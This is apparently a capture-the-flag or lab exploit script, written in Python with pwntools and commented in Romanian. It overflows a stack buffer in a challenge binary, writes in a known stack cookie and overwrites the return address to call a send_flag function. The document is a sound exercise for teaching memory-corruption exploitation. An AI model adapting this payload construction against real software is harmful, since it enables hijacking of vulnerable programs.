#!/usr/bin/env python3

import sys
import subprocess

from pwn import log, elf, process, p32

EXECUTABLE_PATH = "cookie_lover.elf"
COOKIE_GENERATOR_PATH = "./generate_cookie.elf"
FLAG_PREFIX = b"SI{"
FLAG_SUFFIX = "}"
PAYLOAD_FILE = "payload.bin"


def main() -> None:
    # Preia simbolul funcției send_flag
    executable = elf.ELF(EXECUTABLE_PATH, checksec=False)
    send_flag = executable.symbols["send_flag"]
    log.info("Adresa funcției send_flag este {}.".format(hex(send_flag)))

    # Creează un proces nou pe baza executabilului
    p = process.process(EXECUTABLE_PATH)
    output = p.recv(timeout=0.1)

    # Lansează un proces pentru generarea unui stack cookie
    cookie = process.process(COOKIE_GENERATOR_PATH).recvall()
    cookie = int(cookie)
    log.info("Stack cookie-ul generat este {}.".format(cookie))

    # Creează payload-ul de forma:
    # OVERFLOW_GARBAGE + COOKIE + SEND_FLAG_SYMBOL + REST_GARBAGE
    payload = 28 * b'a'
    payload += p32(cookie)
    payload += p32(send_flag)
    payload += (64 - 28 - 2 * 4) * b'a'

    # Scrie payload-ul într-un fișier
    payload_file = open(PAYLOAD_FILE, "wb")
    payload_file.write(payload)
    payload_file.close()

    # Trimite payload-ul și verifică textul întors
    p.send(payload)
    final_output = p.recvall()
    if (final_output.find(FLAG_PREFIX) != -1):
        final_output = final_output[:-2].decode("utf-8")
        log.success(
            "Exploit-ul a avut succes. Textul ce conține flag-ul este:\n{}".
            format(final_output))
    else:
        log.failure(
            "Exploit-ul pare ca nu funcționează. Textul returnat este:\n{}\n".
            format(final_output))
    p.close()


if __name__ == "__main__":
    main()